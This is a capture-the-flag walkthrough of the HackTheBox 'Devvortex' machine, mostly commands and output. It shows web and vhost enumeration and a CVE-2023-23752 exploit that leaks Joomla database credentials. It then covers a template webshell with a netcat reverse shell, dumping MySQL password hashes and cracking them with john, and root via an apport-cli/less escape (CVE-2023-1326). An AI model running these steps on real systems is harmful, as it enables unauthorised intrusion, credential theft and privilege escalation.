---
title: HTB - Devvortex
date: 2023-11-27
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, nmap, http, webserver, nginx, whatweb, wappalyzer, gobuster, dirsearch, robots-txt, vhost-busting, cve-2023-23752, ssti, mysql, hash, john, aport-cli, cve-2023-1326]
img_path: /assets/htb/fullpwn/devvortex/
published: true
image:
    path: room_banner.jpg
---

## Overview

|:-:|:-:|
|Machine|[Devvortex](https://app.hackthebox.com/machines/577)|
|Rank|Easy|
|Time|5h|
|Focus|vHost-busting, CVEs, SSTI|

> CONTENT HIDDEN - ACTIVE MACHINE!
{: .prompt-warning}

<!-- 
## 1. INITIAL ENUM

```shell
# TCP SYN common port scanning
sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 $IP

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 2. WEB SERVER ENUM

```shell
whatweb -a3 -v http://devvortex.htb
WhatWeb report for http://devvortex.htb
Status    : 200 OK
Title     : DevVortex
IP        : 10.10.11.242
Country   : RESERVED, ZZ

Summary   : Bootstrap[4.3.1], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery[3.4.1], nginx[1.18.0], Script[text/javascript], X-UA-Compatible[IE=edge]

Detected Plugins:
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with
        HTML, CSS, and JS.

        Version      : 4.3.1
        Version      : 4.3.1
        Website     : https://getbootstrap.com/

[ Email ]
        Extract email addresses. Find valid email address and
        syntactically invalid email addresses from mailto: link
        tags. We match syntactically invalid links containing
        mailto: to catch anti-spam email addresses, eg. bob at
        gmail.com. This uses the simplified email regular
        expression from
        http://www.regular-expressions.info/email.html for valid
        email address matching.

        String       : info@DevVortex.htb

[ HTML5 ]
        HTML version 5, detected by the doctype declaration


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to
        identify the operating system from the server header.

        OS           : Ubuntu Linux
        String       : nginx/1.18.0 (Ubuntu) (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse HTML documents, handle events, perform animations, and add AJAX.

        Version      : 3.4.1
        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and returns the script language/type.

        String       : text/javascript

[ X-UA-Compatible ]
        This plugin retrieves the X-UA-Compatible value from the
        HTTP header and meta http-equiv tag. - More Info:
        http://msdn.microsoft.com/en-us/library/cc817574.aspx

        String       : IE=edge

[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance HTTP server and reverse proxy, as well as an IMAP/POP3 proxy server.

        Version      : 1.18.0
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0 (Ubuntu)
        Date: Sun, 26 Nov 2023 17:35:53 GMT
        Content-Type: text/html
        Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
        Transfer-Encoding: chunked
        Connection: close
        ETag: W/"6500a3d2-4680"
        Content-Encoding: gzip
```

```shell
dirsearch -u http://devvortex.htb

[17:33:12] 301 -  178B  - /js  ->  http://devvortex.htb/js/
[17:33:20] 200 -    7KB - /about.html
[17:33:35] 200 -    9KB - /contact.html
[17:33:36] 301 -  178B  - /css  ->  http://devvortex.htb/css/
[17:33:43] 403 -  564B  - /images/
[17:33:43] 301 -  178B  - /images  ->  http://devvortex.htb/images/
[17:33:45] 403 -  564B  - /js/

Task Completed
```

<figure>
    <img src="wappa.png"
    alt="Wappalyzer report" >
</figure>

> ZAP spidering.

<figure>
    <img src="zap_spidering.png"
    alt="ZAP spidering" >
</figure>

```shell
gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```

```shell
dirsearch -u http://dev.devvortex.htb/
[19:47:38] 200 -    3KB - /web.config.txt
[19:47:13] 200 -   31B  - /tmp/
[19:47:08] 200 -   31B  - /templates/
[19:47:08] 200 -   31B  - /templates/index.html
[19:47:09] 200 -    0B  - /templates/system/
[19:46:08] 200 -   31B  - /plugins/
[19:46:22] 200 -    5KB - /README.txt
[19:46:28] 200 -  764B  - /robots.txt
[19:45:22] 200 -   31B  - /media/
[19:45:05] 200 -   31B  - /libraries/
[19:45:06] 200 -   18KB - /LICENSE.txt
[19:45:04] 200 -   31B  - /layouts/
[19:44:48] 200 -   31B  - /includes/
[19:44:46] 200 -   31B  - /images/
[19:44:41] 200 -    7KB - /htaccess.txt
[19:43:36] 200 -   31B  - /components/
[19:43:42] 200 -    0B  - /configuration.php
[19:43:21] 200 -   31B  - /cache/
[19:42:39] 200 -   31B  - /administrator/logs/
[19:42:40] 200 -   12KB - /administrator/ --\> login page
[19:42:40] 200 -   12KB - /administrator/index.php
[19:42:39] 200 -   31B  - /administrator/cache/
```

```shell
whatweb -a3 -v http://dev.devvortex.htb
WhatWeb report for http://dev.devvortex.htb
Status    : 200 OK
Title     : Devvortex
IP        : 10.10.11.242
Country   : RESERVED, ZZ

Summary   : Bootstrap, Cookies[1daf6e3366587cf9ab315f8ef3b5ed78], Email[contact@devvortex.htb,contact@example.com,info@Devvortex.htb,info@devvortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[1daf6e3366587cf9ab315f8ef3b5ed78], Lightbox, nginx[1.18.0], Script, UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]

Detected Plugins:
[ Cookies ]
Display the names of cookies in the HTTP headers. The values are not returned to save on space.

String: 1daf6e3366587cf9ab315f8ef3b5ed78

[ Email ]
  String: 
	contact@devvortex.htb, 
	contact@example.com,
	info@Devvortex.htb,
	info@devvortex.htb

[ HttpOnly ]
If the HttpOnly flag is included in the HTTP set-cookie response header and the browser supports it then the cookie cannot be accessed through client side script 
More Info http://en.wikipedia.org/wiki/HTTP_cookie

String: 1daf6e3366587cf9ab315f8ef3b5ed78
```

```
# dev.devvortex.htb/robots.txt

# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

> [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): [PoC](https://github.com/Acceis/exploit-CVE-2023-23752)

```shell
sudo ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

<figure>
    <img src="logged_in_as_admin.png"
    alt="Logged in as admin" >
</figure>

## 3. INITIAL FOOTHOLD

> **Huge rabbit hole**  
> PHP 7.4.3  
> [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only)  
> [PoC](https://github.com/neex/phuip-fpizdam), [Usage](https://ine.com/blog/cve-201911043-exploiting-the-phuip-fpizdam-vulnerability)

<figure>
    <img src="template_webshell.png"
    alt="Server-side Template Injection" >
</figure>

```shell
curl http://dev.devvortex.htb/templates/cassiopeia/pwn.php
```

```shell
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.242] 35642
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 10:39:06 up 1 day,  2:11,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

## 4. LATERAL MOVEMENT

```shell
$ cd home
$ ls
logan
$ cd logan
$ ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

```shell
www-data@devvortex:/$ netstat -ltn
netstat -ltn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
www-data@devvortex:/$ netstat -lt
netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
```

```shell
www-data@devvortex:/$ mysql -u lewis -pP4ntherg0t1n5r3c0n## -h localhost
mysql -u lewis -pP4ntherg0t1n5r3c0n## -h localhost
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 140571
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```shell
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password
                            | block | sendEmail | registerDate        | lastvisitDate       | activation | params
                                                                                     | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-27 10:25:37 | 0          |
                                                                                     | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL
     |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
```

> logan's hash: `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

```shell
john hash --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:03 DONE (2023-11-27 10:59) 0.2762g/s 397.7p/s 397.7c/s 397.7C/s winston..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
www-data@devvortex:/$ su logan
su logan
Password: tequieromucho

logan@devvortex:/$ cat user.txt
cat user.txt
cat: user.txt: No such file or directory
logan@devvortex:/$ ls
ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
boot  dev    home  lib32  libx32  media       opt  root  sbin  sys  usr
logan@devvortex:/$ cd home
cd home
logan@devvortex:/home$ cd logan
cd logan
logan@devvortex:~$ cat user.txt
cat user.txt
ae3a55103076c8d25f7c4010580c0170
```

## 5. PRIVESC

```shell
logan@devvortex:~$ sudo -l
sudo -l
[sudo] password for logan: ae3a55103076c8d25f7c4010580c0170

Sorry, try again.
[sudo] password for logan: tequieromucho

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

> [CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326#:~:text=Description,local%20attacker%20can%20escalate%20privilege.): [PoC](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)


### Creating and keeping a crash report (using `less`).

```shell
# create a crash file for less
logan@devvortex:/$ sudo /usr/bin/apport-cli /usr/bin/less
sudo /usr/bin/apport-cli /usr/bin/less

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.................

What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
# choosing to keep the report
Please choose (S/V/K/I/C): k
k^J
# the crash file, i.e., report, is generated
Problem report file: /tmp/apport.less.2gv7a9ri.apport
```

### Then you can use the exploit as explained [here](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) using the newly-generated report:

```shell
# use the exploit
logan@devvortex:/$ sudo /usr/bin/apport-cli -c /tmp/apport.less.2gv7a9ri.apport
</bin/apport-cli -c /tmp/apport.less.2gv7a9ri.apport

What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
v^J
WARNING: terminal is not fully functional
-  (press RETURN)
:!id
!iidd!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
:!cat /root/root.txt
!ccaatt  //rroooott//rroooott..ttxxtt!cat /root/root.txt
a018baec037ce9a218071e0b308efdc1
!done  (press RETURN)
``` -->


<figure>
    <img src="devvortex_pwned.png"
    alt="Cozy machine pwned" >
</figure>